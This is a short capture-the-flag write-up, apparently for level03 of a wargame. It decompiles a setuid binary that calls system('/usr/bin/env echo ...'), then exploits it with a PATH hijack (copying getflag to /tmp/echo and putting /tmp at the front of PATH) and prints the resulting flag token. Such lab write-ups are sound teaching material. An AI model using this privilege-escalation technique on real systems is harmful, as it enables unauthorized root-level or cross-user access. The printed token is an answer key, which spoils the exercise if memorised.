What do we have?

	$ ll
		total 24
	dr-x------ 1 level03 level03  120 Mar  5  2016 ./
	d--x--x--x 1 root    users    340 Aug 30  2015 ../
	-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout*
	-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
	-r-x------ 1 level03 level03  675 Apr  3  2012 .profile*

A `level03` binary, with `-rws` in right! After searching, `s` mean that the binary can use the rights of execution as the owner instead of the current user. Let's use `Ghidra` to reconstruct, with more or less fiability, the original C code:

	/* WARNING: Unknown calling convention */

	int main(int argc,char **argv,char **envp)

	{
	__gid_t __rgid;
	__uid_t __ruid;
	int iVar1;
	gid_t gid;
	uid_t uid;
	
	__rgid = getegid();
	__ruid = geteuid();
	setresgid(__rgid,__rgid,__rgid);
	setresuid(__ruid,__ruid,__ruid);
	iVar1 = system("/usr/bin/env echo Exploit me");
	return iVar1;
	}

So it's a program that get the effective ids (`flag03`), and set it for the execution of the `/usr/bin/env echo Exploit me` from `system`. After, unsuccessfully, searching a complex way of altering variables and call to `echo` via `gdb` for hours, we realized that maybe we shouldn't modify the program, but trick it; launching `getflag` as `echo`. To do it, we copy `/bin/getflag` into `/tmp/` as `echo`, and add `/tmp` to the front of the `PATH` variable of env.

	$ which getflag
	/bin/getflag
	$ cp -R /bin/getflag /tmp/echo
	$ export PATH=/tmp:$PATH

And then, we execute `level03`.

	$ ./level03
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
